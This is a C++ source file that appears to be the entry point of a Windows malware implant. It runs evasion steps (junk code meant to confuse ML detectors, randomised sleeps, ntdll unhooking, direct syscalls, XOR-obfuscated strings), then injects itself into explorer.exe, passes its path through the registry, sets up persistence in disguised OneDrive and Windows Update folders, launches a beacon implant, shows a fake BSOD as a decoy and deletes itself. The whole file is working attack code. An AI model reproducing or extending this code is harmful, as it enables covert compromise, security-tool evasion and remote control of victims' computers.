#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/Detection.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include "utils/Obfuscator.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>
#include <cwctype>

namespace {
    // Junk logic to confuse ML
    void ConfuseML() {
        std::vector<int> v = {1, 5, 2, 8, 3};
        std::sort(v.begin(), v.end());
        int sum = 0;
        for (int i : v) sum += i;
        if (sum > 1000) LOG_DEBUG("Junk sort");
    }

    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        std::vector<uint8_t> buffer(size);
        DWORD read;
        ReadFile(hFile, buffer.data(), size, &read, NULL);
        CloseHandle(hFile);
        return buffer;
    }

    bool IsSystemProcess() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        std::wstring sPath(path);
        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
        // "explorer.exe"
        if (sPath.find(utils::DecryptW(L"\x3f\x22\x2a\x36\x35\x28\x3f\x22\x54\x31\x2c\x31")) != std::wstring::npos) return true;
        return false;
    }

    bool IsRunningFromPersistLocation() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        std::wstring sPath(path);
        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
        if (sPath.find(L"\\microsoft\\onedrive\\") != std::wstring::npos) return true;
        if (sPath.find(L"\\microsoft\\windows\\update\\") != std::wstring::npos) return true;
        return false;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    ConfuseML();
    Sleep(15000 + (GetTickCount() % 15000));

    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 1;

    if (IsSystemProcess()) {
        // Use Volatile Environment for stealthy IPC
        wchar_t dropperPath[MAX_PATH];
        HKEY hKey;
        // "Volatile Environment"
        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(L"\x1c\x35\x36\x3b\x2e\x33\x38\x3f\x1a\x1f\x34\x2c\x33\x28\x35\x34\x37\x3f\x34\x3e").c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD sz = sizeof(dropperPath);
            // "DropperPath"
            if (RegQueryValueExW(hKey, utils::DecryptW(L"\x0e\x28\x35\x2a\x2a\x3f\x28\x1a\x3b\x2e\x32").c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                Sleep(60000 + (GetTickCount() % 60000));
                persistence::establishPersistence(dropperPath);
            }
            RegCloseKey(hKey);
        }

        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    if (IsRunningFromPersistLocation()) {
        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    // Dropper instance
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    HKEY hKey;
    // "Volatile Environment"
    if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(L"\x1c\x35\x36\x3b\x2e\x33\x38\x3f\x1a\x1f\x34\x2c\x33\x28\x35\x34\x37\x3f\x34\x3e").c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        // "DropperPath"
        RegSetValueExW(hKey, utils::DecryptW(L"\x0e\x28\x35\x2a\x2a\x3f\x28\x1a\x3b\x2e\x32").c_str(), 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            decoy::ShowBSOD();
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        }
    }

    persistence::establishPersistence();
    decoy::ShowBSOD();
    CoUninitialize();
    utils::SelfDeleteAndExit();
    return 0;
}
